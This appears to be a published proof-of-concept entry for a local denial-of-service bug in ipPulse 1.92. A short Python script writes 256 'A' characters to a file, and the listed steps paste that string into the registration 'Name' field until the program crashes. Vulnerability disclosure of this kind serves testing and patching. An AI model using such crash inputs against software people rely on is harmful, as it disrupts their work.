# Exploit Title: ipPulse 1.92 - 'Enter Key' Denial of Service (PoC)
# Discovery by: Diego Buztamante
# Discovery Date: 2019-11-18
# Vendor Homepage: https://www.netscantools.com/ippulseinfo.html
# Software Link : http://download.netscantools.com/ipls192.zip
# Tested Version: 1.92
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: Windows 10 Pro x64 es

# Steps to Produce the Crash:
# 1.- Run python code : python ipPulse_1.92.py
# 2.- Open ipPulse_1.92.txt and copy content to clipboard
# 3.- Open ippulse.exe
# 4.- Click on "Enter Key"
# 5.- Paste ClipBoard on "Name: "
# 6.- OK
# 7.- Crashed

#!/usr/bin/env python

buffer = "\x41" * 256
f = open ("ipPulse_1.92.txt", "w")
f.write(buffer)
f.close()